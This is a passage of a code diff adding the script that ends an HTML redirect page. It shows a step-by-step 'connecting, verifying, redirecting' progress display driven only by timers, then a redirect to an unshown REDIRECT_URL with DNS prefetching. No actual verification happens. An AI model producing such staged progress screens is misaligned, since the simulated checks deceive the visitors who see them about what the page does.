+            circle.classList.remove('completed');
+            circle.innerHTML = i;
+            status.innerHTML = '<span class="loader-tiny"></span> Processing...';
+        } else {
+            circle.classList.remove('active','completed');
+            circle.innerHTML = i;
+            var statusKey = 'step' + i + 'Status';
+            status.innerHTML = '<i class="bi bi-hourglass-split"></i> ' + dict[statusKey];
+        }
+    }
+}
+
+function startRedirectFlow() {
+    statusText.textContent = dict.statusConn;
+    updateStepUI(1);
+    setTimeout(function() {
+        statusText.textContent = dict.statusVer;
+        updateStepUI(2);
+        setTimeout(function() {
+            statusText.textContent = dict.statusRedir;
+            updateStepUI(3);
+            setTimeout(function() {
+                window.location.replace(REDIRECT_URL);
+            }, 1500);
+        }, 2000);
+    }, 2000);
+}
+
+/* ================================================================
+   DNS PREFETCH & PRECONNECT
+   ================================================================ */
+var link = document.createElement('link');
+link.rel = 'dns-prefetch';
+link.href = REDIRECT_URL;
+document.head.appendChild(link);
+var link2 = document.createElement('link');
+link2.rel = 'preconnect';
+link2.href = REDIRECT_URL;
+document.head.appendChild(link2);
+
+})();
+</script>
+</body>
+</html>
